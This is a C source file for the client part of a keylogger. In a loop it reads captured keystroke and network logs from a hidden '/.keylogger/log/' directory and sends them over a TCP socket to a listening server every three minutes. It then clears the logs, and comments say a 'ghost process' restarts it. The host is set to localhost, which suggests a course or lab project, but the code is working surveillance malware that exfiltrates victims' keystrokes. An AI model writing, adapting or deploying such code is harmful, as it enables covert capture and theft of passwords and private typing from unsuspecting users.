#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "client.h"

#define BUFFER_SIZE 2000

void start_client(void)
{
    // Variables
    int sock;
    int ret =0;
    struct sockaddr_in server;
    char send_buffer[BUFFER_SIZE];
    
    char *addr = "127.0.0.1";  // localhost
    short port = 8888;
    
    // Create a socket. Return value is a file descriptor for the socket.
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Client socket created\n");
    
    // Set the server ip address, connection family and port
    server.sin_addr.s_addr = inet_addr(addr);
    server.sin_family      = AF_INET;
    server.sin_port        = htons(port);
    
    // Connect to remote server
    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
        perror("Error establishing connection\n");
        close(sock);
        return;
    }
    printf("Connecting to server...\n");

    ssize_t read_size;
    while(1) {
        sleep(180);
        memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
        /*Open keylog file for writing*/
        FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "r");
        /*Write keylog file*/
        while(fgets(send_buffer, BUFFER_SIZE, keylog_log) != NULL)
        {
            if(write(sock, send_buffer, strlen(send_buffer)) < 0){
                perror("Error writing keylog log\n");
                close(sock);
                // Alright to exit because ghost process will start
                // it up again.
                exit(0);
            }
        }
        write(sock, "_end", 4);
       /*Clear and close keylog file*/
       fclose(fopen("/.keylogger/log/keylog.txt", "w"));

       sleep(5);

       memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
       /*Open network_log file for writing*/
       FILE *network_log = fopen("/.keylogger/log/network.txt", "r");
       /*Write keylog file*/
       while(fgets(send_buffer, BUFFER_SIZE, network_log) != NULL)
       {
           if(write(sock, send_buffer, strlen(send_buffer)) < 0){
               perror("Error writing network log\n");
               close(sock);
               // Alright to exit because ghost process will start
               // it up again.
               exit(0);
           }
       }
       write(sock, "_end", 4);
       /*Clear and close keylog file*/
       fclose(fopen("/.keylogger/log/network.txt", "w"));
   }
    close(sock);
}
